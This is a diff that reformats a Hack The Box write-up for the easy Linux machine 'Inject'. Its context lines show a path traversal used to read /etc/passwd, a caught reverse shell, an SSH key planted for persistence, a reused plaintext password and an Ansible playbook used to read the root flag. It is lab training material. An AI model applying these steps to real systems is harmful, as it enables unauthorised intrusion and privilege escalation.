@@ -1,11 +1,12 @@
-*2023-07-02*
-
-#htb-writeup 
-
+---
+tags:
+  - htb-writeup
+date: 2023-07-02
+---
 > [!Abstract] Introduction
 > This writeup is for the Inject HTB machine. It's labelled an easy Linux box, and it was picked as an opportunity to brush up on my rusty HTB skills.
-> 
-> ![[../Files/Pasted image 20230702232240.png]]
+>
+> ![[Pasted image 20230702232240.png]]
 
 ---
 
@@ -24,7 +25,7 @@ Scanned at 2023-07-02 20:40:07 MDT for 48s
 Not shown: 65533 closed tcp ports (conn-refused)
 PORT     STATE SERVICE     REASON  VERSION
 22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
 | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKZNtFBY2xMX8oDH/EtIMngGHpVX5fyuJLp9ig7NIC9XooaPtK60FoxOLcRr4iccW/9L2GWpp6kT777UzcKtYoijOCtctNClc6tG1hvohEAyXeNunG7GN+Lftc8eb4C6DooZY7oSeO++PgK5oRi3/tg+FSFSi6UZCsjci1NRj/0ywqzl/ytMzq5YoGfzRzIN3HYdFF8RHoW8qs8vcPsEMsbdsy1aGRbslKA2l1qmejyU9cukyGkFjYZsyVj1hEPn9V/uVafdgzNOvopQlg/yozTzN+LZ2rJO7/CCK3cjchnnPZZfeck85k5sw1G5uVGq38qcusfIfCnZlsn2FZzP2BXo5VEoO2IIRudCgJWTzb8urJ6JAWc1h0r6cUlxGdOvSSQQO6Yz1MhN9omUD9r4A5ag4cbI09c1KOnjzIM8hAWlwUDOKlaohgPtSbnZoGuyyHV/oyZu+/1w4HJWJy6urA43u1PFTonOyMkzJZihWNnkHhqrjeVsHTywFPUmTODb8=
 |   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
@@ -32,7 +33,7 @@ PORT     STATE SERVICE     REASON  VERSION
 |   256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
 |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICZzUvDL0INOklR7AH+iFw+uX+nkJtcw7V+1AsMO9P7p
 8080/tcp open  nagios-nsca syn-ack Nagios NSCA
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD OPTIONS
 |_http-title: Home
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -44,7 +45,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Navigating to http://10.10.11.204:8080/ shows that port `8080` is running a web server for "Zodd Cloud".
 
-![[../Files/Pasted image 20230702232637.png]]
+![[Pasted image 20230702232637.png]]
 
 There is an [upload](http://10.10.11.204:8080/upload) page allows us to upload an image, which can then be viewed using the [show_image](http://10.10.11.204:8080/show_image) endpoint. Fortunately for us, this endpoint takings the get parameter `img` which has a path traversal vulnerability. We can use this to read `/etc/passwd` and many other files on the box.
 
@@ -228,7 +229,7 @@ listening on [any] 4242 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.10.11.204] 32852
 bash: cannot set terminal process group (796): Inappropriate ioctl for device
 bash: no job control in this shell
-frank@inject:/$ 
+frank@inject:/$
 ```
 
 > [!success]
@@ -244,14 +245,14 @@ frank@inject:/$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMo7CzQ69kAt3fBTdvZjhZ
 
 ```sh
 ❯ ssh frank@10.10.11.204
-frank@inject:~$ 
+frank@inject:~$
 ```
 
 From here the lateral move was quite simple. All we needed to do was `su` into the `phil` user. This is where the password `DocPhillovestoInject123` we found earlier in `settings.xml` comes in handy.
 
 ```sh
 frank@inject:~$ su - phil
-Password: 
+Password:
 phil@inject:~$ whoami
 phil
 ```
@@ -288,9 +289,9 @@ phil@inject:/opt/automation/tasks$ vim copy-flag.yml
 ```yml
 - hosts: localhost
   tasks:
-  - name: Copy root flag 
-    ansible.builtin.copy: 
-      src: /root/root.txt 
+  - name: Copy root flag
+    ansible.builtin.copy:
+      src: /root/root.txt
       dest: /tmp/hacks-n-snacks/root.txt
 ```
 
@@ -304,8 +305,6 @@ phil@inject:/opt/automation/tasks$ vim copy-flag.yml
 ---
 
 ## Conclusion
-I enjoyed working through this box. I found the steps to get a reverse shell more challenging than some of the other easy Hack The Box boxes I've completed, but it was not so challenging that I felt stuck. 
+I enjoyed working through this box. I found the steps to get a reverse shell more challenging than some of the other easy Hack The Box boxes I've completed, but it was not so challenging that I felt stuck.
 
 Some of my past DevOps experience made the privesc to `root` using Ansible quite straightforward, so that was encouraging. This was a great box to get back into the swing of things with HTB, and it felt great to root it in a single sitting.
-
----
